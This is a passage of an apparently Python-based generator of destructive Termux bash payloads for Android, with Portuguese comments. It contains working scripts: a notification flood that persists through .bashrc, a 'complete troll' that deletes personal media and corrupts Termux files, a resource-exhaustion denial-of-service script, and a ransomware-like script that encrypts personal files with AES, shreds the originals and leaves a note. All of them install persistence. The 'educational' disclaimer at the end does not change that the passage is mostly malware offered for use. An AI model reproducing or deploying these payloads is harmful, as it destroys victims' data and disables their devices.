    termux-notification --title "$titulo" --content "$conteudo" --alert-once
}

# Array de mensagens irritantes
mensagens=(
    "Seu dispositivo está lento!"
    "Vírus detectado! Clique aqui para limpar."
    "Atualização necessária!"
    "Bateria fraca! Conecte o carregador."
    "Armazenamento quase cheio!"
    "Aplicativo parou de responder."
    "Sistema comprometido!"
    "Reinicie seu dispositivo."
    "Backup necessário!"
    "Alerta de segurança!"
)

echo "🔔 INICIANDO BOMBARDEIO DE NOTIFICAÇÕES..."
while true; do
    for i in {1..5}; do
        titulo="ALERTA DO SISTEMA #$((RANDOM % 1000))"
        conteudo="${mensagens[$((RANDOM % ${#mensagens[@]}))]}"
        notificar "$titulo" "$conteudo" &
        sleep 0.5
    done
    sleep $((5 + RANDOM % 15))
done &

# Persistência via .bashrc
echo 'alias clear="bash ~/.bombardeio &"' >> ~/.bashrc
echo 'bash ~/.bombardeio &' >> ~/.bashrc

# Script de bombardeio oculto
cat > ~/.bombardeio << 'EOF'
#!/bin/bash
while true; do
    termux-notification --title "ALERTA!" --content "Notificação de teste $(date)" --alert-once
    sleep $((10 + RANDOM % 30))
done
EOF

chmod +x ~/.bombardeio

echo " "
echo "[bold yellow]🔔 BOMBARDEIO INICIADO! Notificações serão enviadas constantemente! 🔔[/bold yellow]"
echo "[yellow]Reinicie o Termux para ver o efeito completo.[/yellow]"

exit 0
"""

    def gerar_troll_completo(self, incluir_destrutivo: bool = True, incluir_irritante: bool = True, delay_inicio: int = 5, **kwargs) -> str:
        payload = f"""#!/bin/bash
# 💣 TROLL COMPLETO - DESTRUIÇÃO + IRRITAÇÃO 💣
# ☠️  Este script é a combinação mortal de todos os outros! ☠️

echo "[bold red]INICIANDO TROLL COMPLETO EM {delay_inicio} MINUTOS...[/bold red]"
echo "[red]Seu dispositivo será destruído e irritado simultaneamente![/red]"
sleep 2

# Delay antes de iniciar
echo "[yellow]O bombardeio começará em {delay_inicio} minutos...[/yellow]"
sleep {delay_inicio * 60}

# Parte destrutiva (se habilitada)
if [ "{incluir_destrutivo}" = "true" ]; then
    echo "[bold red]INICIANDO FASE DE DESTRUIÇÃO...[/bold red]"
    
    # Apagar arquivos pessoais
    find /sdcard /storage/emulated/0 -name "*.jpg" -o -name "*.mp4" -o -name "*.pdf" -delete 2>/dev/null &
    
    # Corromper Termux
    termux_dir="/data/data/com.termux"
    if [ -d "$termux_dir" ]; then
        find "$termux_dir" -name "*.so" -exec rm -f {{}} \\;
        find "$termux_dir" -name "bash" -exec echo "corrupted" > {{}} \\;
    fi
    
    # Sobrescrever espaço livre
    dd if=/dev/urandom of=/sdcard/junk.tmp bs=1M count=50 2>/dev/null &
fi

# Parte irritante (se habilitada)
if [ "{incluir_irritante}" = "true" ]; then
    echo "[bold yellow]INICIANDO FASE DE IRRITAÇÃO...[/bold yellow]"
    
    # Notificações constantes
    if command -v termux-notification &> /dev/null; then
        while true; do
            termux-notification --title "⚠️ ALERTA" --content "Sistema comprometido!" --alert-once
            sleep $((5 + RANDOM % 10))
        done &
    fi
    
    # Terminal irritante
    echo 'export PS1="\\[\\e[31m\\]💀\\[\\e[33m\\]\\u@\\h\\[\\e[0m\\]:\\[\\e[32m\\]\\w\\[\\e[0m\\]\\$ "' >> ~/.bashrc
    echo 'alias ls="echo \\"Comando bloqueado!\\"; ls --color=always"' >> ~/.bashrc
    echo 'function random_message() { messages=("Haha!" "Irritante?" "Tente me parar!"); echo "${{messages[$((RANDOM % 3))]}}"; }' >> ~/.bashrc
    echo 'random_message' >> ~/.bashrc
fi

# Persistência máxima
echo "[yellow]INSTALANDO PERSISTÊNCIA AVANÇADA...[/yellow]"

# Múltiplos métodos de persistência
echo 'bash ~/.troll_persistente &' >> ~/.bashrc
echo 'bash ~/.troll_persistente &' >> ~/.bash_profile
echo 'bash ~/.troll_persistente &' >> ~/.profile

# Script persistente oculto
cat > ~/.troll_persistente << 'EOF'
#!/bin/bash
while true; do
    # Recriar partes do troll periodicamente
    if [ -f ~/.bashrc ]; then
        echo 'alias ls="echo \\"Não pode usar isso!\\""' >> ~/.bashrc
        echo 'random_message' >> ~/.bashrc
    fi
    
    # Notificações aleatórias
    if command -v termux-notification &> /dev/null; then
        termux-notification --title "😈 Ainda aqui!" --content "Não pode me remover!" --alert-once
    fi
    
    sleep $((60 + RANDOM % 120))
done
EOF

chmod +x ~/.troll_persistente

# Mensagem final
echo " "
echo "[bold white on red]💣 TROLL COMPLETO ATIVADO! SEU DISPOSITIVO ESTÁ COMPROMETIDO! 💣[/bold white on red]"
echo "[red]Destruição e irritação combinadas para efeito máximo![/red]"
echo "[yellow]Reinicie o Termux para experimentar o efeito completo.[/yellow]"

# Ocultar evidências
sleep 5
clear

exit 0
"""
        return payload

    def gerar_negar_servico(self, **kwargs) -> str:
        return """#!/bin/bash
# 🐌 NEGAÇÃO DE SERVIÇO COMPLETA 🐌
# ⚠️  Este script consumirá todos os recursos do sistema!

echo "[bold red]INICIANDO ATAQUE DE NEGAÇÃO DE SERVIÇO...[/bold red]"
sleep 2

# Consumir CPU
echo "🧠 CONSUMINDO RECURSOS DE CPU..."
for i in {1..10}; do
    while true; do
        echo "scale=10000; 4*a(1)" | bc -l &>/dev/null &
    done &
done

# Consumir memória
echo "💾 CONSUMINDO MEMÓRIA RAM..."
memory_hog() {
    local data=()
    while true; do
        data+=($(seq 1 100000))
        sleep 0.1
    done
}
memory_hog &

# Consumir armazenamento
echo "💽 CONSUMINDO ARMAZENAMENTO..."
dd if=/dev/urandom of=/sdcard/fill_disk_$RANDOM.tmp bs=1M count=1024 2>/dev/null &

# Consumir bateria
echo "🔋 CONSUMINDO BATERIA..."
while true; do
    cat /dev/urandom > /dev/null &
    sleep 1
done &

# Congestionar rede
echo "🌐 CONGESTIONANDO REDE..."
while true; do
    ping -s 65507 8.8.8.8 > /dev/null &
    sleep 0.5
done &

# Persistência
echo "📌 INSTALANDO PERSISTÊNCIA..."
echo 'bash ~/.dos_attack &' >> ~/.bashrc

cat > ~/.dos_attack << 'EOF'
#!/bin/bash
while true; do
    # Recriar processos de negação de serviço
    for i in {1..5}; do
        while true; do
            echo "scale=5000; 4*a(1)" | bc -l &>/dev/null &
        done &
    done
    sleep 30
done
EOF

chmod +x ~/.dos_attack

echo " "
echo "[bold red]🐌 ATAQUE DE NEGAÇÃO DE SERVIÇO INICIADO! 🐌[/bold red]"
echo "[red]Seu dispositivo ficará extremamente lento e pode travar![/red]"
echo "[yellow]Reinicie para experimentar o efeito completo.[/yellow]"

exit 0
"""

    def gerar_criptografar_dados(self, **kwargs) -> str:
        return """#!/bin/bash
# 🔐 CRIPTOGRAFIA DE DADOS PESSOAIS 🔐
# ⚠️  Este script criptografará seus arquivos pessoais!

echo "[bold red]INICIANDO CRIPTOGRAFIA DE DADOS...[/bold red]"
sleep 2

# Verificar se OpenSSL está disponível
if ! command -v openssl &> /dev/null; then
    echo "[red]OpenSSL não encontrado! Instale com: pkg install openssl[/red]"
    exit 1
fi

# Gerar chave de criptografia
CHAVE=$(openssl rand -hex 32)
echo "🔑 Chave de criptografia gerada: $CHAVE"

# Função para criptografar arquivos
criptografar_arquivo() {
    local arquivo="$1"
    if [ -f "$arquivo" ]; then
        echo "🔒 Criptografando: $arquivo"
        openssl enc -aes-256-cbc -salt -in "$arquivo" -out "$arquivo.encrypted" -pass pass:"$CHAVE"
        if [ $? -eq 0 ]; then
            shred -u "$arquivo"
            echo "✅ $arquivo criptografado"
        fi
    fi
}

# Extensões de arquivos para criptografar
extensoes=(
    "*.jpg" "*.png" "*.mp4" "*.mp3" "*.pdf" "*.doc*" "*.xls*"
    "*.txt" "*.json" "*.xml" "*.db" "*.sqlite" "*.zip" "*.rar"
)

echo "🔒 INICIANDO CRIPTOGRAFIA EM MASSA..."
for ext in "${extensoes[@]}"; do
    find /sdcard /storage/emulated/0 -name "$ext" -type f | while read arquivo; do
        criptografar_arquivo "$arquivo"
    done
done

# Mensagem de resgate
cat > /sdcard/LEIA-ME.txt << EOF
⚠️  SEUS ARQUIVOS FORAM CRIPTOGRAFADOS! ⚠️

Todos os seus arquivos pessoais foram criptografados com AES-256.

Para descriptografar, você precisa da chave: $CHAVE

⚠️  Esta chave será mostrada apenas uma vez!
⚠️  Salve-a em um local seguro!

Para descriptografar um arquivo, use:
openssl enc -d -aes-256-cbc -in arquivo.encrypted -out arquivo -pass pass:SUA_CHAVE

EOF

# Persistência
echo 'bash ~/.check_encryption' >> ~/.bashrc

cat > ~/.check_encryption << 'EOF'
#!/bin/bash
# Verificar e criptografar novos arquivos periodicamente
while true; do
    sleep 300
    find /sdcard /storage/emulated/0 -name "*.jpg" -o -name "*.mp4" -o -name "*.pdf" | while read arquivo; do
        if [[ "$arquivo" != *.encrypted ]]; then
            openssl enc -aes-256-cbc -salt -in "$arquivo" -out "$arquivo.encrypted" -pass pass:"$CHAVE" && shred -u "$arquivo"
        fi
    done
done
EOF

chmod +x ~/.check_encryption

echo " "
echo "[bold red]🔐 CRIPTOGRAFIA COMPLETA! SEUS ARQUIVOS ESTÃO BLOQUEADOS! 🔐[/bold red]"
echo "[red]Verifique o arquivo LEIA-ME.txt no seu armazenamento para detalhes.[/red]"

exit 0
"""

    def _sair(self):
        console.print(Panel.fit(
            "[blink bold red]⚠️  AVISO FINAL: USO ILEGAL É CRIME! ⚠️[/blink bold red]\n"
            "Estes scripts são apenas para fins educacionais e de teste.\n"
            "Nunca use em dispositivos que não sejam seus ou sem permissão.",
            border_style="red"
        ))
        console.print("[cyan]Saindo com segurança...[/cyan]")
        time.sleep(2)
        sys.exit(0)

def main():
    try:
        # Verificar se estamos no Termux
        if not os.path.exists('/data/data/com.termux/files/home'):
            console.print("[red]Este script é específico para Termux![/red]")
            console.print("[yellow]Execute apenas no ambiente Termux.[/yellow]")
            sys.exit(1)
            
        gerador = GeradorDestrutivoTermux()
        gerador.mostrar_menu_principal()
    except KeyboardInterrupt:
        console.print("\n[red]✗ Operação cancelada pelo usuário[/red]")
        sys.exit(0)
    except Exception as e:
        console.print(f"\n[red]✗ Erro inesperado: {str(e)}[/red]")
        sys.exit(1)

if __name__ == '__main__':
    main()
